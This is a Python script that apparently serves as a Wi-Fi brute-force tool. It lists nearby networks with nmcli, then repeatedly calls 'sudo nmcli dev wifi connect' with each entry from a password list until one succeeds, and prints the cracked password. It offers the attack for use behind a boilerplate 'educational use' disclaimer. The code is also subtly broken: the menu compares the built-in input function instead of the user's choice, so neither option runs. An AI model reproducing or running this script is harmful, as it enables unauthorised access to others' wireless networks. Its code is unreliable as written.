import subprocess
from time import sleep
import os
##### VARS #####
ssid_list = []
security_list = []

##### FUNCTIONS #####
def find_networks():
    global ssid_list
    global security_list
    tmp = subprocess.run(["nmcli", "-f", "SSID", "dev", "wifi"], capture_output=True, text=True).stdout
    ssids = tmp.split("\n")
    tmp = subprocess.run(["nmcli", "-f", "SECURITY", "dev", "wifi"], capture_output=True, text=True).stdout
    security = tmp.split("\n")
    del ssids[0]
    del security[0]
    del ssids[-1]
    del security[-1]
    for i in range(len(ssids)):
        ssids[i] = ssids[i].strip()
        security[i] = security[i].strip()
    print(ssids)
    print(security)
    ssid_list = ssids
    security_list = security

def bruteforce(ssid, password=""):
    if password == "":
        with open('resources/passwordlist.txt', 'r') as f:
            codes = f.read().split('\n')
        correct = False
        correct_code = ""
        try:
            for i in range(len(codes)):
                if correct:
                    break
                sleep(2)
                result = subprocess.run(["sudo", "nmcli", "dev", "wifi", "connect", ssid, "password", codes[i]], stdout=subprocess.PIPE)
                print(result)
                if 'returncode=0' in str(result):
                    print(f"correct password found: {codes[i]}")
                    correct_code = codes[i]
                    correct = True
                    break

                else:
                    print("no")
        except:
            print("Error occured in bruteforcing")
        finally:
            print("Ending bruteforce")
            if correct:
                print(f"The password of {ssid} is {correct_code}")
            else:
                print('failed to bruteforce password')

def main():
    print("STARTED\nThis script is purely for educational use. Any consequenses or damages arising from the usage of it in an illegal or unethical way are purely the fault of the end-user, and in no way is the developer responsible for it.")
    print('''
What do you want to do:
1: Log SSIDs of all found networks to file
2: Bruteforce a particular network
          ''')
    option = int(input(">"))
    if input == 1:
        pass
    elif input == 2:
        find_networks()
        print("enter the number following the network ssid to select")
        for i in range(len(ssid_list)):
            print(f"> {ssid_list[i]} < ({i})")
        selected_network = int(input("Enter number here: "))
        bruteforce(ssid_list[selected_network])

if __name__ == '__main__':
    main()